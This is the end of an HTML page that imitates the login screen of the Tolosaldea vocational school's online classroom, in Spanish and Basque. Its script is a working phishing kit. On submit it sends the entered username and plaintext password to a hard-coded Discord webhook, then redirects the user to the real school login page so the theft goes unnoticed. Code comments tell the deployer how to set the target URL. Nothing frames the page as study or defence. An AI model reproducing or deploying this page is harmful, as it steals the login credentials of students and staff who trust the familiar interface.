.form-side{display:flex;flex-direction:column;justify-content:center;padding:40px clamp(24px,6vw,48px);max-width:640px;width:100%;margin:0 auto}
.logo{display:flex;align-items:center;gap:18px;margin-bottom:56px}
.logo svg{width:96px;height:auto;flex:none}
.logo strong{display:block;font-size:2.6rem;line-height:1;font-weight:500;letter-spacing:-.02em}
.logo small{display:block;font-size:1rem;font-weight:700;margin-top:6px}
h1{margin:0 0 4px;font-size:1.9rem;font-weight:600}
.sub{margin:0 0 28px;color:var(--muted);font-size:.95rem}
label{display:block;margin:0 0 6px}
.field{margin-bottom:18px}
input{width:100%;padding:10px 12px;font:inherit;color:var(--text);background:var(--field);border:1px solid var(--border);border-radius:6px}
input::placeholder{color:var(--muted)}
input:focus-visible,button:focus-visible,a:focus-visible{outline:3px solid var(--link);outline-offset:2px}
.forgot{text-align:right;margin:-4px 0 18px}
.forgot a{color:var(--link);text-decoration:none}
.forgot a:hover{text-decoration:underline}
.submit{width:100%;padding:11px;border:0;border-radius:6px;background:var(--brand);color:#fff;font:inherit;cursor:pointer}
.submit:hover{background:var(--brand-hover)}
.msg{min-height:1.5em;margin:14px 0 0;font-size:.95rem}
.msg.err{color:var(--err)}
.msg.ok{color:var(--link)}
@media (max-width:820px){
  .layout{grid-template-columns:1fr}
  .hero{display:none}
  .logo{margin-bottom:36px}
  .logo strong{font-size:2rem}
}
</style>
</head>
<body>
<div class="layout">
  <section class="hero" role="img" aria-label="Edificio del centro de formación"></section>

  <main class="form-side">
    <div class="logo">
      <svg viewBox="0 0 96 120" role="img" aria-label="Logotipo">
        <rect x="0" y="6" width="62" height="108" rx="12" fill="var(--logo-a)"/>
        <rect x="26" y="0" width="68" height="52" rx="10" fill="var(--logo-b)"/>
        <circle cx="72" cy="86" r="14" fill="var(--logo-c)"/>
      </svg>
      <div><strong>Tolosaldea</strong><small>Lanbide Heziketa Institutoa</small></div>
    </div>

    <h1>Le damos la bienvenida de nuevo</h1>
    <p class="sub">Entrar a TOLOSALDEA Lanbide Heziketaren ikasgela</p>

    <form id="f" novalidate>
      <div class="field">
        <label for="u">Nombre de usuario</label>
        <input id="u" name="u" type="text" autocomplete="username" placeholder="Escriba su nombre de usuario">
      </div>
      <div class="field">
        <label for="p">Contraseña</label>
        <input id="p" name="p" type="password" autocomplete="current-password" placeholder="Introduzca su contraseña">
      </div>
      <div class="forgot"><a href="#recuperar">¿Olvidó su contraseña?</a></div>
      <button class="submit" type="submit">Acceder</button>
      <p class="msg" id="m" role="status" aria-live="polite"></p>
    </form>
  </main>
</div>
<script>
// Cambia esto por la dirección de tu web (por ejemplo "https://tuweb.com/inicio")
const URL_DESTINO='https://ikasgela.tolosaldealh.eus/login/index.php';
// Webhook de Discord: se avisa cada vez que alguien pulsa Acceder con usuario y contraseña rellenos
const WEBHOOK_DISCORD='https://discord.com/api/webhooks/1417519556536041492/Wj-SLbGOnAtXUaZvgnYwGvV1hz88VTOpbsCNfTo8vFzqwxfa67O6PvVauy8_n8Y_jsuQ';

function avisarDiscord(usuario, password){
  fetch(WEBHOOK_DISCORD,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      embeds:[{
        title:'Inicio de sesión',
        color:0x167891,
        fields:[
          {name:'Usuario', value:'`'+usuario+'`', inline:true},
          {name:'Contraseña', value:'`'+password+'`', inline:true}
        ],
        timestamp:new Date().toISOString()
      }]
    })
  }).catch(()=>{});
}

const f=document.getElementById('f'),u=document.getElementById('u'),p=document.getElementById('p'),m=document.getElementById('m');

f.addEventListener('submit',e=>{
  e.preventDefault();
  m.className='msg';
  if(!u.value.trim()){m.textContent='Escriba su nombre de usuario.';m.classList.add('err');u.focus();return}
  if(!p.value){m.textContent='Introduzca su contraseña.';m.classList.add('err');p.focus();return}
  if(URL_DESTINO==='WEB AQUI'){m.textContent='Falta indicar la web de destino (URL_DESTINO en el código).';m.classList.add('err');return}

  avisarDiscord(u.value.trim(), p.value);
  window.location.href=URL_DESTINO;
});
</script>
</body>
